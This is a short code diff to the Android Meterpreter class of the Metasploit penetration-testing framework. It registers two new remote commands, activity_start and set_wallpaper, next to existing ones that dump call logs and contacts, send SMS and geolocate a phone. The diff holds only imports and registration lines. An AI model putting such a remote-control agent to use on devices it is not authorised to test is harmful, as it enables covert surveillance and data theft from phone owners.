@@ -4,6 +4,7 @@ import android.content.Context;
 import android.os.Handler;
 import android.os.Looper;
 
+import com.metasploit.meterpreter.android.activity_start_android;
 import com.metasploit.meterpreter.android.check_root_android;
 import com.metasploit.meterpreter.android.dump_calllog_android;
 import com.metasploit.meterpreter.android.dump_contacts_android;
@@ -12,6 +13,7 @@ import com.metasploit.meterpreter.android.geolocate_android;
 import com.metasploit.meterpreter.android.interval_collect;
 import com.metasploit.meterpreter.android.send_sms_android;
 import com.metasploit.meterpreter.android.set_audio_mode_android;
+import com.metasploit.meterpreter.android.set_wallpaper_android;
 import com.metasploit.meterpreter.android.sqlite_query_android;
 import com.metasploit.meterpreter.android.stdapi_fs_file_expand_path_android;
 import com.metasploit.meterpreter.android.stdapi_sys_config_getuid;
@@ -161,8 +163,10 @@ public class AndroidMeterpreter extends Meterpreter {
             mgr.registerCommand("send_sms", send_sms_android.class);
             mgr.registerCommand("wlan_geolocate", wlan_geolocate.class);
             mgr.registerCommand("interval_collect", interval_collect.class);
+            mgr.registerCommand("activity_start", activity_start_android.class);
             mgr.registerCommand("set_audio_mode", set_audio_mode_android.class);
             mgr.registerCommand("sqlite_query", sqlite_query_android.class);
+            mgr.registerCommand("set_wallpaper", set_wallpaper_android.class);
         }
         return getCommandManager().getNewCommands();
     }
